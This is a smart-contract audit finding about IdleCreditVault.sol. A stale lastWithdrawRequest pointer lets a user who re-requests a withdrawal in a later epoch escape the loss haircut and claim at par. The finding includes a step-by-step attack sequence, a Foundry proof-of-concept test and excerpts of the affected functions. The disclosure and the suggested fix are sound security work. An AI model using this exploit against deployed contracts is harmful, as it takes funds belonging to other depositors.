### Title
Stale `lastWithdrawRequest` pointer skips `lossRecoveryPriceByEpoch` haircut, letting a re-requester claim a loss-adjusted receipt at par - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` stores a `lossRecoveryPriceByEpoch[epoch]` and only pulls the haircutted amount from the borrower [1](#0-0) . On claim, `_claimLossAdjustedWithdrawRequest` looks up the haircut exclusively via `lastWithdrawRequest[_user]` [2](#0-1) . A user who places a new withdraw request in a later epoch overwrites `lastWithdrawRequest` [3](#0-2) , so the loss-adjusted epoch's entry is skipped and the whole aggregate `withdrawsRequests[_user]` — including the haircutted E1 receipt — is paid at par by `_claimFundedWithdrawRequest` [4](#0-3) .

### Finding Description
Analogous to CVE-2021-22174 (crafted input drives the parser past a state check → crash), a crafted request sequence drives the claim dispatcher past the haircut branch:

1. Epoch E1: attacker requests withdraw; `lastWithdrawRequest[attacker] = E1`, `withdrawsRequestsByEpoch[attacker][E1] = X`.
2. Manager calls `stopEpochWithDuration(..., lossAmount)`; `collectWithdrawFunds` sets `lossRecoveryPriceByEpoch[E1] = p < RECOVERY_FULL`, sets `pendingWithdraws = 0`, and pulls only `X * p` underlyings into the strategy.
3. Epoch E2 (running): attacker calls `cdoEpoch.requestWithdraw` again with any amount (dust works; the comments explicitly allow stacking requests). `lastWithdrawRequest[attacker] = E2`, `withdrawsRequestsByEpoch[attacker][E2] += Y`, `withdrawsRequests[attacker] = X + Y`.
4. After E2's stop, attacker calls `claimWithdrawRequest`:
   - `_claimLossAdjustedWithdrawRequest`: `lossEpoch = lastWithdrawRequest = E2`; `lossRecoveryPriceByEpoch[E2] == 0` → returns 0 without clearing the E1 receipt.
   - `_claimFundedWithdrawRequest`: epoch gate `epochNumber <= lastWithdrawRequest` now passes; `amount = withdrawsRequests[attacker] = X + Y` is paid at par via `_transferFundedClaim` [5](#0-4) .

The strategy only received `X*p + Y` for this user, so the extra `X*(1-p)` is paid out of other users' funded claims / reserve-adjacent strategy balance. The orphaned `withdrawsRequestsByEpoch[attacker][E1]` entry is never cleared, confirming the haircut path was bypassed.

### Impact Explanation
Direct theft quantified as `X * (RECOVERY_FULL - lossRecoveryPriceByEpoch[E1]) / RECOVERY_FULL`. With a 50% loss-adjusted epoch and a `X = 100_000e6` receipt, the attacker extracts an extra ~50,000 underlying that belongs to other funded claimants (the claim drains strategy underlyings earmarked for them, or reverts only if the strategy balance is insufficient — in which case other users' claims become unpayable, i.e., insolvency/freeze). Broken invariant: loss waterfall — pending receipts must bear `stopEpochWithDuration` losses pro rata; instead one user escapes the haircut entirely.

### Likelihood Explanation
- Requires only unprivileged actions: two `requestWithdraw` calls in different epochs bracketing a `stopEpochWithDuration` loss. No privileged cooperation.
- `stopEpochWithDuration` with `_lossAmount > 0` is a supported, manager-invoked mode used precisely when the borrower underpays.
- The attacker's only cost is temporarily locking `X` plus a dust `Y` for one extra epoch; the exploit is deterministic once a loss epoch exists.
- Existing guards don't stop it: the `epochNumber <= lastWithdrawRequest` gate only enforces waiting, `_transferFundedClaim`'s reserve guard only protects `defaultRecoveryReserve` (which is 0 in the loss-adjusted path), and nothing re-checks per-epoch prices for earlier receipts in `_claimFundedWithdrawRequest`.

### Recommendation
In `claimWithdrawRequest` / `_claimFundedWithdrawRequest`, iterate or track all epochs with outstanding `withdrawsRequestsByEpoch[_user][*]` (e.g., keep a per-user epoch list or store the loss epoch explicitly on the receipt) and apply `lossRecoveryPriceByEpoch` per epoch instead of keying solely off `lastWithdrawRequest[_user]`. Alternatively, revert `requestWithdraw` when the user has an unclaimed receipt whose `lossRecoveryPriceByEpoch` is non-zero, forcing the haircutted claim to settle first.

### Proof of Concept
Foundry fork test sketch (against `IdleCreditVault.t.sol` harness style):

```solidity
function testPocLossAdjustedClaimBypassedByLaterRequest() external {
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0); // APR0-free path, isolate loss

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");
    uint256 X = 100_000 * ONE_SCALE;

    // both deposit, start epoch E1
    _depositWithUser(attacker, X, true);
    _depositWithUser(victim,   X, true);
    _startEpochAndCheckPrices(0);

    // both request withdraw in buffer of E1
    vm.prank(attacker); cdoEpoch.requestWithdraw(0, address(AAtranche));
    vm.prank(victim);   cdoEpoch.requestWithdraw(0, address(AAtranche));

    // stop E1 with 50% loss on pending receipts
    uint256 pendingBasis = strategy.pendingWithdraws();
    uint256 loss = pendingBasis / 2;
    uint256 pendingToFund = pendingBasis - loss;
    deal(defaultUnderlying, borrower, pendingToFund);
    vm.prank(borrower); underlying.approve(address(cdoEpoch), pendingToFund);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, 0, cdoEpoch.epochDuration(), loss);
    // lossRecoveryPriceByEpoch[E1] = 0.5e18 now

    // E2: attacker re-requests dust; victim does nothing
    _startEpochAndCheckPrices(1);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(1, address(AAtranche)); // overwrite lastWithdrawRequest -> E2
    // fund E2 fully
    uint256 p2 = strategy.pendingWithdraws();
    deal(defaultUnderlying, borrower, p2);
    vm.prank(borrower); underlying.approve(address(cdoEpoch), p2);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, 0, cdoEpoch.epochDuration(), 0);

    // victim claims first: gets haircutted 0.5 * X (correct)
    uint256 vPre = underlying.balanceOf(victim);
    vm.prank(victim); cdoEpoch.claimWithdrawRequest();
    assertApproxEqAbs(underlying.balanceOf(victim) - vPre, X / 2, 10);

    // attacker claims: skips E1 haircut because lastWithdrawRequest = E2
    // paid X + dust at par instead of X/2 + dust -> drains strategy beyond funded amount
    uint256 aPre = underlying.balanceOf(attacker);
    vm.prank(attacker); cdoEpoch.claimWithdrawRequest();
    // assert theft: received full X rather than X/2
    assertGt(underlying.balanceOf(attacker) - aPre, X / 2 + 1);
}
```

Key assertions to verify while reproducing: `strategy.lossRecoveryPriceByEpoch(E1) == 0.5e18` after step 3; `strategy.lastWithdrawRequest(attacker) == E2` after step 4; and that `_claimLossAdjustedWithdrawRequest` returns 0 for the attacker (observable via the uncleared `withdrawsRequestsByEpoch[attacker][E1]`, which remains non-zero after the claim — an orphaned ledger entry proving the haircut was never applied).

  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
